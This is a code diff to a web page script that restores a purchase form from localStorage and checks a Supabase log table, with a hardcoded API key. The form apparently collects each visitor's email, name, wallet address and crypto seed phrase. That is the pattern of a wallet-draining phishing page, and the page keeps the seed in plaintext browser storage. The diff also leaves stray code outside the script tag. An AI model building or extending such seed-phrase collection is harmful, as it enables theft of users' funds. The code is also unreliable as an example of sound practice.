@@ -417,40 +417,42 @@
     </div>
 
 <script>
-document.addEventListener('DOMContentLoaded', () => {
+(async function() {
   // 1. Check Supabase: if status is complete, clear local/session storage and reload before restore
   const flowID = localStorage.getItem('flow_id');
+  let statusComplete = false;
+
   if (flowID) {
-    fetch(`https://xlbquzoalvwmtjadteft.supabase.co/rest/v1/create_log?flow_id=eq.${flowID}`, {
-      headers: {
-        "apikey": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhsYnF1em9hbHZ3bXRqYWR0ZWZ0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDg3Mjg4MjEsImV4cCI6MjA2NDMwNDgyMX0.mwSXeQIXJ8FgGtmcqDTnAFchcTXdnLWpCqkcj_3rnXU"
-      }
-    })
-    .then(res => res.json())
-    .then(rows => {
+    try {
+      const res = await fetch(`https://xlbquzoalvwmtjadteft.supabase.co/rest/v1/create_log?flow_id=eq.${flowID}`, {
+        headers: {
+          "apikey": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhsYnF1em9hbHZ3bXRqYWR0ZWZ0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDg3Mjg4MjEsImV4cCI6MjA2NDMwNDgyMX0.mwSXeQIXJ8FgGtmcqDTnAFchcTXdnLWpCqkcj_3rnXU"
+        }
+      });
+      const rows = await res.json();
       if (rows[0] && rows[0].status === 'complete') {
         localStorage.removeItem('flow_id');
         localStorage.removeItem('user_email');
         localStorage.removeItem('user_name');
         localStorage.removeItem('wallet_address');
         localStorage.removeItem('seed_phrase');
-        // Reload the page after clearing, so restore logic doesn't run on old data
+        statusComplete = true;
         location.reload();
-      } else {
-        // 2. Restore fields if localStorage/session
-        restoreFieldsAndContinue();
+        return;
       }
-    });
-  } else {
-    // 2. Restore fields if localStorage/session
-    restoreFieldsAndContinue();
+    } catch (e) {
+      // Fail open (do nothing, allow page to load)
+    }
   }
 
-  function restoreFieldsAndContinue() {
+  // 2. Restore fields if not completed
+  document.addEventListener('DOMContentLoaded', () => {
     const savedEmail = localStorage.getItem('user_email') || '';
     const savedName = localStorage.getItem('user_name') || '';
     const savedWallet = localStorage.getItem('wallet_address') || '';
     const savedSeed = localStorage.getItem('seed_phrase') || '';
+    const flowIDNow = localStorage.getItem('flow_id') || '';
+
     // Autofill all fields
     if (savedEmail) document.getElementById('user-email').value = savedEmail;
     if (savedName) document.getElementById('user-name').value = savedName;
@@ -463,7 +465,7 @@ document.addEventListener('DOMContentLoaded', () => {
     // If all fields exist & not complete, scroll to purchase and show retry msg
     const paymentComplete = localStorage.getItem('payment_complete');
     if (
-      flowID && savedEmail && savedName && savedWallet && savedSeed && !paymentComplete
+      flowIDNow && savedEmail && savedName && savedWallet && savedSeed && !paymentComplete
     ) {
       setTimeout(() => {
         const purchaseSection = document.getElementById('purchase-section');
@@ -476,8 +478,11 @@ document.addEventListener('DOMContentLoaded', () => {
         if (purchaseBtn) purchaseBtn.parentNode.insertBefore(msgDiv, purchaseBtn);
       }, 200);
     }
-  }
-});
+  });
+})();
+
+// --- All your other functions (wallet, saveSessionFields, etc.) go BELOW this block ---
+</script>
 
 // Use these on Create Wallet / Email / Purchase click:
 function saveSessionFields() {
